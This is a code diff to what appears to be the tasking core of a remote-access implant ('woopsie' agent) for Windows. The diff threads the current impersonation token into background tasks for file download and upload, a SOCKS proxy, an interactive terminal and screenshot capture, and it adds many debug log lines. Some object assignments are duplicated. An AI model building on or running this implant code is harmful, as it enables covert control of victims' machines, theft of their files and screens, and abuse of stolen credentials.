@@ -198,8 +198,8 @@ public class Agent {
             // Check if the result indicates a background task should be started
             java.util.Map<String, Object> result = commHandler.createTaskResult(taskId, output);
             
-            // If the result has a "download" field and no "completed", it's requesting background processing
-            if (result.containsKey("download") && !result.containsKey("completed")) {
+            // If the result has a "download" or "upload" field and no "completed", it's requesting background processing
+            if ((result.containsKey("download") || result.containsKey("upload")) && !result.containsKey("completed")) {
                 Config.debugLog(config, "Task " + taskId + " requires background processing");
                 return startBackgroundTask(taskId, command, parameters);
             }
@@ -261,8 +261,9 @@ public class Agent {
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
                 final String finalFullPath = fullPath;
                 final int finalTotalChunks = totalChunks;
+                final WinNT.HANDLE tokenForBgTask = currentImpersonationToken;
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
-                    new com.woopsie.tasks.DownloadBackgroundTask(taskHolder[0], config, finalFullPath, finalTotalChunks).run();
+                    new com.woopsie.tasks.DownloadBackgroundTask(taskHolder[0], config, finalFullPath, finalTotalChunks, tokenForBgTask).run();
                 });
                 taskHolder[0] = bgTask;
                 
@@ -301,10 +302,15 @@ public class Agent {
                 
                 Config.debugLog(config, "Upload metadata - fullPath: " + fullPath + ", fileId: " + fileId);
                 
+                // Debug: Log when starting upload background task
+                Config.debugLog(config, "[DEBUG] Registering upload background task for taskId: " + taskId);
+                Config.debugLog(config, "[DEBUG] backgroundTasks keys before registration: " + backgroundTasks.keySet());
+                
                 // Create the background task
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                final WinNT.HANDLE tokenForBgTask = currentImpersonationToken;
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
-                    new UploadBackgroundTask(taskHolder[0], config, fullPath, fileId).run();
+                    new UploadBackgroundTask(taskHolder[0], config, fullPath, fileId, tokenForBgTask).run();
                 });
                 taskHolder[0] = bgTask;
                 
@@ -316,17 +322,20 @@ public class Agent {
                 
                 Config.debugLog(config, "Background upload task started for: " + taskId);
                 
+                // Log backgroundTasks keys after registration
+                Config.debugLog(config, "[DEBUG] backgroundTasks keys after registration: " + backgroundTasks.keySet());
+                
                 // Return the initial upload response (without completed flag)
                 return commHandler.createTaskResult(taskId, output);
             } else if ("socks".equals(command)) {
                 // SOCKS proxy - start background task
                 Config.debugLog(config, "Starting SOCKS background task");
-                
                 // Create the background task (don't execute SocksTask)
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
                     new com.woopsie.tasks.SocksBackgroundTask(taskHolder[0], config).run();
                 });
+                taskHolder[0] = bgTask;
                 taskHolder[0] = bgTask;
                 
                 // Store the background task for later processing
@@ -342,12 +351,13 @@ public class Agent {
             } else if ("pty".equals(command)) {
                 // PTY - start background task
                 Config.debugLog(config, "Starting PTY background task");
-                
                 // Create the background task (don't execute PtyTask)
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                final WinNT.HANDLE tokenForBgTask = currentImpersonationToken;
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
-                    new com.woopsie.tasks.PtyBackgroundTask(taskHolder[0], config).run();
+                    new com.woopsie.tasks.PtyBackgroundTask(taskHolder[0], config, tokenForBgTask).run();
                 });
+                taskHolder[0] = bgTask;
                 taskHolder[0] = bgTask;
                 
                 // Store the background task for later processing
@@ -363,12 +373,13 @@ public class Agent {
             } else if ("screenshot".equals(command)) {
                 // Screenshot - start background task to capture and upload
                 Config.debugLog(config, "Starting screenshot background task");
-                
                 // Create the background task
                 final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                final WinNT.HANDLE tokenForBgTask = currentImpersonationToken;
                 BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
-                    new com.woopsie.tasks.ScreenshotBackgroundTask(taskHolder[0], config).run();
+                    new com.woopsie.tasks.ScreenshotBackgroundTask(taskHolder[0], config, tokenForBgTask).run();
                 });
+                taskHolder[0] = bgTask;
                 taskHolder[0] = bgTask;
                 
                 // Store the background task for later processing
@@ -401,6 +412,7 @@ public class Agent {
     private java.util.Map<String, Object> processBackgroundTask(String taskId, String parameters) {
         try {
             Config.debugLog(config, "Processing background_task message for: " + taskId);
+            Config.debugLog(config, "[DEBUG] processBackgroundTask: backgroundTasks keys: " + backgroundTasks.keySet());
             
             // Find the background task
             BackgroundTask bgTask = backgroundTasks.get(taskId);
@@ -469,9 +481,13 @@ public class Agent {
                 return;
             }
             
+            Config.debugLog(config, "[DEBUG] routeToBackgroundTask: backgroundTasks keys: " + backgroundTasks.keySet());
+            Config.debugLog(config, "[DEBUG] routeToBackgroundTask: Routing to taskId: " + taskId);
+            
             BackgroundTask bgTask = backgroundTasks.get(taskId);
             if (bgTask == null) {
                 Config.debugLog(config, "Background task not found for routing: " + taskId);
+                Config.debugLog(config, "[DEBUG] Background task not found for routing: " + taskId + " (upload/download chunk)");
                 return;
             }
             
@@ -524,8 +540,12 @@ public class Agent {
             
             // Only remove task if thread has actually died (not just marked complete)
             if (!bgTask.isAlive()) {
+                Config.debugLog(config, "[DEBUG] pollBackgroundTasks: Task " + taskId + " thread is NOT alive (command=" + bgTask.getCommand() + ")");
                 Config.debugLog(config, "Background task thread died: " + taskId);
+                Config.debugLog(config, "[DEBUG] pollBackgroundTasks: Removing completed task " + taskId + ", isAlive=" + bgTask.isAlive() + ", running=" + bgTask.running);
                 completedTasks.add(taskId);
+            } else {
+                Config.debugLog(config, "[DEBUG] pollBackgroundTasks: Task " + taskId + " thread IS alive (command=" + bgTask.getCommand() + ")");
             }
         }
         
@@ -538,6 +558,7 @@ public class Agent {
         for (String taskId : completedTasks) {
             BackgroundTask bgTask = backgroundTasks.remove(taskId);
             if (bgTask != null) {
+                Config.debugLog(config, "[DEBUG] pollBackgroundTasks: Removing completed task " + taskId + ", isAlive=" + bgTask.isAlive() + ", running=" + bgTask.running);
                 bgTask.stop();
             }
         }
